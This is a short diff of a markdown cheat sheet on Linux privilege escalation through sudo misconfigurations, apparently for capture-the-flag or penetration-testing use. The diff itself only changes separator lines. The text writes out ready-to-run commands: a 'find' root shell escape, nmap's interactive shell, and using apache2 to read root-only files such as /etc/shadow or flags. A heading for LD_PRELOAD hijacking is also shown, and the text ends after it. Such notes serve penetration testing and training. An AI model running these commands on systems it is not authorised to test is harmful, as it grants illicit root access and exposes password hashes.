@@ -1,4 +1,4 @@
-
+-------------------------------------------------
 ## .Linux Privilege Escalation - Sudo Exploits
 -------------------------------------------------
 
@@ -9,13 +9,13 @@ Works when `sudo -l` shows programs like `find`, `nmap`, `vim`, `less`, `awk`.
 sudo find . -exec /bin/sh \; -quit
 sudo nmap --interactive
 !sh
------------------------------------------------------
+
 ### 2. Apache2 File Read
 Used when `sudo -l` shows `/usr/sbin/apache2`.
 sudo apache2 -f /root/root.txt
 This reads any file as root and often leaks `/etc/shadow` or flags.
 
-------------------------------------------------------
+
 
 ### 3. LD_PRELOAD Hijack
 Works when `sudo -l` shows `env_keep+=LD_PRELOAD`.
